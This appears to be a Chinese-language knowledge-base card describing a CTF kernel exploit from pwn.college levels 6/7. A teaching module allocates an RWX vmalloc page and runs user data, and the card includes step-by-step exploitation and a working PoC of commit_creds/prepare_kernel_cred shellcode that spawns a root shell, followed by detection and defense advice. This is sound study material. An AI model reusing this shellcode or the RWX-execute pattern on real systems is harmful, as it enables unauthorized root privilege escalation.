---
id: binary-pwn-kernel-rwx-vmalloc-user-shellcode-exec
title: 内核 RWX vmalloc + 用户 shellcode 执行：commit_creds 提权
type: scenario
domain: binary
path: binary/pwn/kernel
technique: kernel-rwx-vmalloc-user-shellcode-exec
tags:
- kernel
- pwn
- vmalloc
- rwx
- shellcode
- commit-creds
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V161
  verified_at: '2026-11-06T09:50:40+08:00'
  notes: 已对照原文核对代码/地址/偏移与利用链，一致；原文为 pwn.college 教学环境，卡内已标注地址偏移依赖具体内核版本/配置，未复跑 PoC。
url: /docs/binary/pwn/kernel/binary-pwn-kernel-rwx-vmalloc-user-shellcode-exec/
draft: false
kb_aliases:
- 内核 RWX 内存
- vmalloc 可执行页
- 内核 shellcode 提权
- pwn.college level 6/7
- commit_creds shellcode
---

## 一句话结论

内核模块用 `vmalloc(4096, ..., _default_kernel_pte_mask & 0x163)` 分配了一块未设置 NX 位的 RWX 页，`write()` 把用户数据 `copy_from_user` 到该页后直接 `((void(*)(void))shellcode)()` 调用；攻击者写入手写内核 shellcode（`prepare_kernel_cred(0)` + `commit_creds`）即可提权。

## 原理

- **RWX 分配**：`vmalloc(size, gfp, prot)` 的第三个参数是页表属性；`_default_kernel_pte_mask & 0x163` 保留了 Present/RW/Accessed/Dirty 等位，但没有设置 NX（第 63 位），因此映射可读可写可执行。
- **用户数据直达可执行页**：`device_write` 用 `copy_from_user(shellcode, buffer, n)` 把用户 buffer 写入该页，随后直接 call；没有对内容做校验/签名。
- **内核 shellcode**：在 ring 0 执行 `prepare_kernel_cred(0)` 得到 root cred，再 `commit_creds(rax)`；返回用户态后当前进程即 root。本题无 KASLR，符号地址从 `/proc/kallsyms` 直接读取（practice 模式 root 可读）。
- **level 7 变体**：改用 ioctl 传结构体（`size` + `shellcode[0x1000]` + `addr`），由用户指定执行地址；`shellcode` 指针在 `.bss`，可从 `/sys/module/challenge/sections/.bss` 读基址并用 gdb 读指针值。
- **为什么危险**：W^X 被破坏；用户可控数据被当代码执行；内核符号地址可读；这是教学模块故意留下的“可执行内存 + 用户 shellcode”原语。
- **本题**：`commit_creds=0xffffffff81089310`、`prepare_kernel_cred=0xffffffff81089660`；shellcode 写入后 `system("/bin/sh")` 即 root。

## 触发条件

- 内核模块分配 RWX 页（或通过 `set_memory_x` 等把页改为可执行），并把用户数据写入后执行。
- 无 KASLR 或可泄露内核符号地址；`/proc/kallsyms` 可读或已知符号偏移。
- 用户对设备有写权限；模块不会校验 shellcode 内容。
- 内核允许执行模块分配的页（未强制 W^X）。

## 利用步骤

1. 逆向模块，确认 `vmalloc` 的保护参数无 NX，`write`/`ioctl` 把用户数据拷入该页并 call。
2. 获取 `commit_creds`/`prepare_kernel_cred` 地址（`/proc/kallsyms` 或已知偏移）。
3. 用 pwntools 汇编内核 shellcode：
   ```asm
   xor rdi, rdi
   mov rax, prepare_kernel_cred
   call rax
   mov rdi, rax
   mov rax, commit_creds
   call rax
   ret
   ```
4. 通过 write/ioctl 把 shellcode 写入设备；模块执行后当前进程获得 root。
5. `system("/bin/sh")` 或读 `/flag`。
6. level 7 变体：构造 `{size, shellcode, addr}`，`addr` 指向 `.bss` 中保存的 shellcode 页地址（从 gdb/内核内存读取）。

## PoC

```python
from pwn import *
context.arch = "amd64"
shellcode = """
    xor rdi, rdi
    mov rax, 0xffffffff81089660   /* prepare_kernel_cred */
    call rax
    mov rdi, rax
    mov rax, 0xffffffff81089310   /* commit_creds */
    call rax
    ret
"""
print(asm(shellcode).hex())
```

```c
// 把 shellcode 写入 /proc/pwncollege，模块会执行
unsigned char sc[] = { /* 上面的机器码 + 0x00 padding */ };
write(fd, sc, sizeof(sc));
system("/bin/sh");
```

说明：地址来自原文 pwn.college level 6/7 的无 KASLR 环境；不同内核需重新取符号。PoC 未在本机复跑。

## 变体与关联

- **level 7 任意执行地址**：ioctl 结构体允许指定 `addr`；需要泄露 `.bss` 中的 shellcode 指针（`/sys/module/challenge/sections/.bss` + gdb）。
- **W^X 绕过**：若模块只分配 RW，可用 `set_memory_x`、BPF JIT、`mmap` 可执行映射等；参见 [[binary-pwn-kernel-netfilter-hash-collision-uaf-kmem-cache-ctor]]（slab shellcode）。
- **KASLR**：通过 printk/dmesg、`/proc/kallsyms`、模块 sections 泄露基址；参见 [[binary-pwn-kernel-module-ioctl-user-function-pointer-call]]。
- **关联**：[[binary-pwn-stack-ret2shellcode-mprotect-bss-rwx-page]]（用户态 mprotect RWX + ret2shellcode）。

## 检测与防御

- **W^X**：内核页默认 NX；禁止 `vmalloc`/`set_memory_x` 分配 RWX 用户可控页；启用 `CONFIG_STRICT_KERNEL_RWX`。
- **不执行用户数据**：模块不应把用户 buffer 当代码；如必须执行，做签名/白名单/隔离。
- **KASLR/符号隐藏**：开启 KASLR、限制 `/proc/kallsyms` 和 `/sys/module/*/sections`；SMEP/SMAP 阻止用户页执行。
- **检测**：监控模块加载、RWX 内核页、`vmalloc` 可执行映射、异常 ioctl/write；对 `/proc/<device>` 写入可执行内容告警。
